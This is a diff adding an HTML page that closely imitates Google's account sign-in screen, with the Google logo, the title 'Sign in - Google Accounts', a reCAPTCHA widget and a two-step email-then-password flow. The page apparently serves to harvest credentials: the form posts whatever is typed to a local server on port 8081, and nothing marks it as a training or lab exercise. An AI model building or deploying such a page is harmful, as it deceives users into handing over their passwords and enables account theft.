@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        /* Reset and general styles */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f7f7f7;
+        }
+
+        .container {
+            max-width: 400px;
+            background-color: white;
+            border: 1px solid #ddd;
+            padding: 40px;
+            box-shadow: 0px 2px 8px rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            text-align: left; /* Align text to the left */
+            position: relative;
+        }
+
+        .logo {
+            width: 44px;
+            height: 44px;
+            margin-bottom: 24px;
+            display: block;
+        }
+
+        .title {
+            font-size: 28px; /* Make the text taller */
+            font-weight: 500; /* Make the text slightly less bold */
+            color: #202124;
+            margin-bottom: 16px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 36px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+            position: relative;
+            text-align: left;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        .form-group label {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #80868b;
+            pointer-events: none;
+            font-size: 16px;
+            transition: all 0.2s ease;
+        }
+
+        .form-group input:focus + label,
+        .form-group input:not(:placeholder-shown) + label {
+            top: -8px;
+            left: 8px;
+            background-color: white;
+            padding: 0 4px;
+            color: #1a73e8;
+            font-size: 12px;
+        }
+
+        .button {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 25px; /* Make the button oval */
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .button:hover {
+            background-color: #185abc;
+        }
+
+        .button:disabled {
+            background-color: #ddd;
+            cursor: not-allowed;
+        }
+
+        a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: bold; /* Make the links bold */
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .forgot-email {
+            display: block;
+            margin-top: 12px;
+            text-align: left;
+            font-size: 13px; /* Make the text smaller */
+            font-weight: bold; /* Make the text bolder */
+        }
+
+        .guest-mode {
+            margin-top: 20px;
+            margin-bottom: 32px;
+            font-size: 14px;
+            color: #5f6368;
+            text-align: left;
+        }
+
+        .additional-links {
+            margin-top: 24px;
+            font-size: 14px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center; /* Align items vertically */
+        }
+
+        .recaptcha-container {
+            margin-top: 32px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://developers.google.com/static/identity/images/g-logo.png" alt="Google G Logo" class="logo">
+        <h1 class="title">Sign in</h1>
+        <p class="subtitle">Use your Google Account</p>
+        <form id="signInForm" action="http://localhost:8081" method="post">
+            <div id="form-section">
+                <div class="form-group">
+                    <input type="text" id="email-password" name="email" name="password" placeholder=" " required>
+                    <label for="email-password">Email or phone</label>
+                </div>
+                <a href="#" class="forgot-email">Forgot email?</a>
+                <div class="guest-mode">
+                    Not your computer? Use a private window to sign in.
+                    <a href="#">Learn more about using Guest mode</a>
+                </div>
+            </div>
+            <div class="recaptcha-container">
+                <div class="g-recaptcha" data-sitekey="6LeDOtIqAAAAAIyJzBcrrCzOSruU5mc6VG-QvFoz"></div>
+            </div>
+            <div class="additional-links">
+                <a href="#">Create account</a>
+                <button id="next" class="button" type="submit">Next</button>
+            </div>
+        </form>
+    </div>
+
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <script>
+        const signInForm = document.getElementById('signInForm');
+        const nextButton = document.getElementById('next');
+        const inputField = document.getElementById('email-password');
+
+        let isEmailStep = true;
+
+        function handleNextStep() {
+            const inputValue = inputField.value.trim();
+
+            if (isEmailStep) {
+                if (validateEmail(inputValue)) {
+                    inputField.value = "";
+                    inputField.type = "password";
+                    inputField.placeholder = " ";
+                    inputField.nextElementSibling.textContent = "Password";
+                    nextButton.textContent = "Sign In";
+                    isEmailStep = false;
+                } else {
+                    alert("Please enter a valid email");
+                }
+            } else {
+                if (inputValue !== "") {
+                    signInForm.submit();
+                } else {
+                    alert("Please enter a password");
+                }
+            }
+        }
+
+        signInForm.addEventListener('submit', function (event) {
+            event.preventDefault(); // Prevents default form submission
+            handleNextStep();
+        });
+
+        inputField.addEventListener('keydown', function(event) {
+            if (event.key === 'Enter') {
+                event.preventDefault(); // Prevents default form submission
+                handleNextStep();
+            }
+        });
+
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+    </script>
+</body>
+</html>
